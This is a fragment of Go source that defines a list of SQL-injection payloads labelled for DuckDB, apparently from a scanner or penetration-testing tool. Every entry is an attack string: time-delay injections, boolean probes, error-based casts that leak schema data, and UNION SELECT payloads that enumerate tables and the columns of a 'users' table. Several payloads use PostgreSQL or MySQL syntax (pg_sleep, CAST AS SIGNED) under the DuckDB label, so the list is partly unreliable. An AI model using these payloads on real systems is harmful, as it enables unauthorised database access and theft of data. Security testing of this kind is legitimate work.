...
var DuckDB = PayloadGroup{
	...
	Payloads: []Payload{
		...
		{Type: "time", Content: "'; SELECT pg_sleep(3)--"},
		{Type: "time", Content: "'; SELECT pg_sleep(8)--"},
		{Type: "time", Content: "' OR pg_sleep(5)--"},
		{Type: "time", Content: "' AND pg_sleep(10)--"},
		...
		{Type: "boolean", Content: "' AND 1=1 AND 'a'='a", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2 AND 'a'='a", Expected: "false"},
		{Type: "error", Content: "' AND 1=CAST((SELECT table_schema||table_name FROM information_schema.tables) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT column_name||table_name FROM information_schema.columns) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT database_name FROM duckdb_databases()) AS SIGNED)--"},
		{Type: "deep", Content: "' UNION SELECT schema_name||'.'||table_name FROM information_schema.tables WHERE table_schema='main'--"},
		{Type: "deep", Content: "' UNION SELECT column_name||':'||data_type||':'||is_nullable FROM information_schema.columns WHERE table_name='users'--"},
		{Type: "deep", Content: "' UNION SELECT table_catalog||'.'||table_schema||'.'||table_name||'.'||column_name FROM information_schema.columns ORDER BY 1--"},
